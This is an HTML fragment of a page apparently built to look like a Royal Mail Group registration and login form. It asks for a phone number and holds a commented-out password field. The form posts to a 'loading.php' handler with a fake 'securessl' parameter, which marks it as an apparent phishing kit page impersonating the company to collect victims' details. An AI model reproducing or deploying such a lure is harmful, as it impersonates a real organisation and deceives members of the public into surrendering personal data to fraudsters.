...
<link rel="shortcut icon" href="favicon.ico" type="image/vnd.microsoft.icon">
    ...
    <title>Register Now | Royal Mail Group Ltd</title>
  ...
  <div class="container">
    <div class="row">
      <div class="login-form-column">
        <form class="user-login-form" data-drupal-selector="user-login-form" data-msg-required="This field is required." action="loading.php?&sessionid=$hash&securessl=true" method="POST" id="user-login-form" accept-charset="UTF-8" autocomplete="off">
          <input autocomplete="off" data-drupal-selector="form-03zo4kee8qnbpfwvspidohsgilfh3blfww8acjgwlma" data-msg-required="This field is required." type="hidden" name="form_build_id" value="form-03ZO4kEe8qNBPFWvSpIDOhsgILfh3BLfww8AcjGwLMA">
<input data-drupal-selector="edit-user-login-form" data-msg-required="This field is required." type="hidden" name="form_id" value="user_login_form">
<h1 data-drupal-selector="edit-title" data-msg-required="This field is required.">Registration</h1>
<div class="form-item-name js-form-item form-item js-form-type-textfield form-type-textfield js-form-item-name">
      <label for="edit-name" class="js-form-required form-required">Phone Number
...
<a id="edit-name--description" class="description tooltip-trigger" href="javascript:">
  <span class="icon__wrapper"><svg class="icon icon--question" focusable="false" aria-hidden="true" role="img" xmlns:xlink="http://www.w3.org/1999/xlink"><use xlink:href="#question"></use></svg></span>
          ...
          <span class="tooltip-text visually-hidden">Enter your phone number which was used to register with Royal Mail Group.</span>
</a>

          <input autofocus="autofocus" placeholder="07XXXXXXXXX" data-drupal-selector="edit-pass" aria-describedby="edit-pass--description" data-msg-maxlength="Phone number incorrect." data-msg-required="Phone Number is required." type="text" id="phone" name="phone" size="60" maxlength="12" class="form-text required" pattern="\d+" oninvalid="setCustomValidity('Phone Number Invalid, try again!')" oninput="setCustomValidity('')" required="required" aria-required="true">
...
<a id="edit-pass--description" class="description tooltip-trigger" href="javascript:">
  <span class="icon__wrapper"><svg class="icon icon--question" focusable="false" aria-hidden="true" role="img" xmlns:xlink="http://www.w3.org/1999/xlink"><use xlink:href="#question"></use></svg></span>
          ...
          <input data-drupal-selector="edit-pass" aria-describedby="edit-pass--description" data-msg-maxlength="Password field has a maximum length of 128." data-msg-required="Password is required." type="password" id="password" name="password" size="60" maxlength="128" class="form-text required" required="required" aria-required="true">

        </div>
      -->
      <!--
<a href="" class="new-password" data-drupal-selector="edit-new-password" data-msg-required="Send me a new password is required." id="edit-new-password">Send me a new password</a>
-->
<div data-drupal-selector="edit-actions" class="form-actions js-form-wrapper form-wrapper" data-msg-required="This field is required." id="edit-actions"><input data-drupal-selector="edit-submit" data-msg-required="This field is required." type="submit" id="edit-submit" name="op" value="Continue" class="button js-form-submit form-submit button--submit">
</div>
<!--
<label data-drupal-selector="edit-register-label" data-msg-required="Not registered yet? is required." for="edit-register-label">Not registered yet?
</label><a href="register.php" class="button button--secondary" data-drupal-selector="edit-register-link" data-msg-required="Register is required." id="edit-register-link">Register</a><label data-drupal-selector="edit-other-accounts" data-msg-required="Other Royal Mail accounts is required." for="edit-other-accounts">Other Royal Mail accounts
      </label><a href=" " class="oba-link" data-drupal-selector="edit-oba-link" data-msg-required="Online Business Account login is required." id="edit-oba-link">Online Business Account login</a><a href="" class="click-drop-link" target="_blank" data-drupal-selector="edit-click-drop-link" data-msg-required="Click &amp; Drop is required." id="edit-click-drop-link">Click &amp; Drop</a>
        </form>
      </div>
    </div>
  </div>
